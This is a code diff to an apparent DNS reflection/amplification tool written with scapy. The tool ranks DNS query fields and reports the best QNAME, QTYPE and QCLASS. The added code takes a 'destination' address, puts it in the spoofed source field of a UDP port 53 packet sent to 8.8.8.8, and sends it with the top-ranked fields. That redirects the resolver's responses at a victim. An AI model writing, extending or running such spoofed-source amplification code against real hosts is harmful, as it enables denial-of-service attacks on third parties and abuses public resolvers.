@@ -24,6 +24,7 @@ rankedQNAME = [""] * 10
 rankedQCLASS = [""] * 10
 rankedQTYPE = [""] * 10
 ipSource = ""
+ipDestination = ""
 
 """
 FUNCTION NAME: sendAutoPacket
@@ -136,9 +137,10 @@ def runRankedSolutions():
 
 
 
-def startDNSAuto(source):
+def startDNSAuto(source,destination):
 
     ipSource = source
+    ipDestination = destination
 
     getSolutions()
     runSolutions()
@@ -149,5 +151,30 @@ def startDNSAuto(source):
     print("THE BEST SOLUTION IS")
     print(rankedSolutions[0])
     prompt = '<div> <h1> DNS Best Fields: </h1>' +'<p> Qname: '+ rankedSolutions[0][1]+'</p>'+'<p> Qtype: '+ rankedSolutions[0][2]+'<p> Qclass: '+ rankedSolutions[0][3]+'</p>'+'</div>'
+
+    packetFinal = (scapy.IP(
+                            version=4,
+                            ihl=5,
+                            tos=0,
+                            #len=ipLen, #length is calculated later in the program, user shouldnt enter it 
+                            id=1,
+                            flags=0,
+                            frag=0,
+                            ttl=64,
+                            proto=17,
+                            #chksum=ipChksum,#either have to find a way to calculate chksum or just let scapy do it
+                            src= ipDestination,
+                            dst= "8.8.8.8",
+                            #options=ipOptions
+                            )
+                    /scapy.UDP(
+                            sport=53,
+                            dport=53,
+                            #chksum=udpChksum #either have to find a way to calculate chksum or just let scapy do it
+                            )
+                    )
+
+    sendlist = [rankedSolutions[0][1],rankedSolutions[0][2],rankedSolutions[0][3]]
+    sPacket.sendPacketDNS(packetFinal, sendlist)
 
     return prompt
